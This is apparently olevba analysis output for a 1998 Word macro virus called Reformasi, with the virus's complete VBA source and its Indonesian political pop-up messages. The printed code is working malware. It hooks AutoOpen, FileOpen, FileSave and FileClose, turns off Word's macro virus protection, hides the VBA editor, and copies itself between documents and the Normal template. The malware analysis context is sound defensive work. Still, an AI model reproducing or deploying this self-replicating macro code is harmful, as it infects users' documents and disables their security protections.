olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FormAbout.frm 
in file: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d - OLE stream: 'Macros/VBA/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub

Private Sub CommandButton1_KeyDown(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
    If Shift = 2 Then
        Unload FormAbout
        FormReformis.Show
    End If
End Sub

Private Sub CommandButton1_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)

End Sub

Private Sub Label1_Click()

End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    
End Sub

Private Sub Label2_Click()

End Sub

Private Sub Label2_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload Me
    ShowVisualBasicEditor = True
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO FormKunci.frm 
in file: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d - OLE stream: 'Macros/VBA/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO FormReformis.frm 
in file: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d - OLE stream: 'Macros/VBA/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub

Private Sub CommandButton2_Click()
    FormKunci.Show
End Sub

Private Sub Label1_Click()

End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload FormReformis
    FormAbout.Show
End Sub

Private Sub Label2_Click()

End Sub

Private Sub Label2_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload FormReformis
    FormAbout.Show
End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_Initialize()
End Sub

-------------------------------------------------------------------------------
VBA MACRO ModuleReformis.bas 
in file: Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d - OLE stream: 'Macros/VBA/ModuleReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'==================================================================
' Nama virus             : Virus Reformasi
' Diprogram oleh         : ~Akut Wajuxacqupi~
' Tanggal pembuatan      :  8 Agustus 1998
' Tanggal peluncuran     : 10 Agustus 1998
' Dibuat di              : Jakarta, Indonesia
' Lingkungan             : Microsoft Word Version 8.0 ( MS-Office 97)
'===================================================================
'

Public AlertAsli
Public AkanDisimpan

Sub ReformInisialisasi()
    Application.DisplayAlerts = wdAlertsMessageBox
    AlertAsli = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    WordBasic.DisableAutoMacros 0
    On Error Resume Next
    If Dir("c:\acyond.off", vbHidden) = "" And _
        Year(Date) > 1998 Then
        AutoCorrect.Entries.Add Name:="yond", Value:=" "
    Else
        AutoCorrect.Entries("yond").Delete
    End If
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub

Sub ReformTutup()
    Application.DisplayAlerts = AlertAsli
End Sub

Sub NormKeDok()
    On Error GoTo Keluar
    AkanDisimpan = False
    DokTerkena = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Kesalahan1
    For n = 1 To AD.VBProject.vbcomponents.Count
        nm = AD.VBProject.vbcomponents(n).Name
        If nm = "ModuleReformis" Then DokTerkena = True
        If (nm <> "FormAbout") And (nm <> "FormKunci") And _
           (nm <> "FormReformis") And (nm <> "ModuleReformis") And _
           (nm <> "ThisDocument") And (nm <> "Reference to Normal") Then
           Application.OrganizerDelete Source:=AD.FullName, _
           Name:=nm, Object:=wdOrganizerObjectProjectItems
        End If
    Next n
Kesalahan1:
    If DokTerkena = False Then
        On Error GoTo Kesalahan2
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormAbout", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormKunci", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormReformis", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="ModuleReformis", _
            Object:=wdOrganizerObjectProjectItems
        ActiveDocument.VBProject.Name = "Reformasi"
        AkanDisimpan = True
Kesalahan2:
    End If
Keluar:
End Sub

Sub DokKeNorm()
    On Error GoTo Keluar2
    NormTerkena = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Kesalahan3
    For n = 1 To NT.VBProject.vbcomponents.Count
        nm = NT.VBProject.vbcomponents(n).Name
        If nm = "ModuleReformis" Then NormTerkena = True
        If (nm <> "FormAbout") And (nm <> "FormKunci") And _
           (nm <> "FormReformis") And (nm <> "ModuleReformis") And _
           (nm <> "ThisDocument") Then
           Application.OrganizerDelete Source:=NT.FullName, _
           Name:=nm, Object:=wdOrganizerObjectProjectItems
        End If
    Next n
Kesalahan3:
    If NormTerkena = False Then
        On Error GoTo Kesalahan4
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormAbout", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormKunci", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormReformis", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="ModuleReformis", _
            Object:=wdOrganizerObjectProjectItems
        Templates(NT.FullName).Save
Kesalahan4:
    End If
Keluar2:
End Sub

Sub AnginReformasi()
    ReformInisialisasi
    DokKeNorm
    ReformTutup
End Sub

Sub Simpan()
    On Error GoTo Kesalahan5
    If AkanDisimpan = True Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, _
        fileformat:=wdFormatDocument
    End If
Kesalahan5:
End Sub

Sub AutoOpen()
    AnginReformasi
    Selection.WholeStory
    Selection.Font.Hidden = False
    Selection.HomeKey unit:=wdStory
End Sub

Sub FileClose()
    On Error GoTo AdaSalah
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    Selection.WholeStory
    Selection.Font.Hidden = True
    If Left(ActiveDocument.Name, 8) <> "Document" Then _
       Application.DisplayAlerts = wdAlertsNone
    ActiveDocument.Close
AdaSalah:
End Sub

Sub FileOpen()
    AnginReformasi
    Dialogs(wdDialogFileOpen).Show
    ReformInisialisasi
    NormKeDok
    Simpan
    ReformTutup
End Sub

Sub FileSaveAs()
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    On Error GoTo Kesalahan6
    If Not ActiveDocument.Saved Then ActiveDocument.Save
Kesalahan6:
End Sub

Sub HelpAbout()
    On Error GoTo Kesalahan7
    FormAbout.Show
Kesalahan7:
End Sub

Sub FileExit()
    On Error GoTo Kesalahan8
    If (Year(Date) > 1998 And WeekDay(Date) = vbFriday And Dir("c:\reform.off", vbHidden) = "") Then FormReformis.Show
    Application.Quit
Kesalahan8:
End Sub

Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    AnginReformasi
End Sub

Sub FileNew()
    AnginReformasi
    Dialogs(wdDialogFileNew).Show
End Sub

Sub FileTemplates()
    AnginReformasi
End Sub

Sub ToolsMacro()
    AnginReformasi
End Sub

Sub ToolsCustomizeKeyboard()
    AnginReformasi
End Sub

Sub ToolsCustomize()
    AnginReformasi
End Sub

Sub ViewVBCode()
    AnginReformasi
    ShowVisualBasicEditor = False
End Sub

Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sebuah persembahanan dari seorang Reformis.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kode: 47.91.21.10.51.268�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Politik
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kembalikan kekuasaan negara kepada rakyat. Pastikan MPR/DPR benar-benar mewakili suara hati rakyat. Tempatkan orang-orang terbaik dan profesianal di negeri ini pada lembaga-lembaga negara. Ingat: 'The right man on the right place'.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomak
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ekonomi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yang membuat suatu negara makmur adalah apa yang dimiliki negeri itu (sumber daya alam) dan apa yang kita terima dari negara lain (devisa). Untuk itu, tingkatkan perolehan hasil dari alam kaya kita: perluas pertanian dan perkebunan dan olah hasil tambang secara optimal. Perolehlah devisa sebanyak-banyaknya: olah industri pariwisata dengan profesional dan modern; jadikan proyek nasional unggulan, perbesar ekspor baik komoditi maupun sumber daya manusia terdidik. Pastikan distribusi pendapatan dapat merata dengan membasmi habis monopoli dan kartel.�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sosiali
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Rangsang tumbuhnya kehidupan sosial yang sehat dan dinamis. Sadarkan: negara kita sangat majemuk; jangan sampai satu suku bangsa merasa lebih dari lainnya; kita satu dan bersaudara dalam kesatuan utuh Negara Kesatuan Republik Indonesia.�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Budayai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tingkatkan dan pertahankan budaya tinggi negari kita. Jangan lupa bahwa negara kita adalah negara agamis yang bermoral tinggi. Cegah berkembangnya budaya rusak dan rendah yang kadang berkulit indah. Lindungi rakyat negara kita dari kerusakkannya.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pertahanan dan Keamanan8�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Jadikan Angkatan Bersenjata Republik Indonesia menjadi pelindung rakyat yang tangguh dan disegani dari serangan negara luar. Perluas wawasan terhadap jenis serangan yang lebih maju dari sekedar serangan fisik.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Negara kita tercinta akan segera memasuki masa keemasannya setelah para reformis membersihkan negeri ini dari kotoran-kotoran yang menghalangi negeri besar ini dari kejayaannya.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hidup Reformasi Damai!n8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kunci Kejayaann
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Reformasi-24c51fc015c3b08334dc7c29984f8f65c99a9c3d' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |47.91.21.10         |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

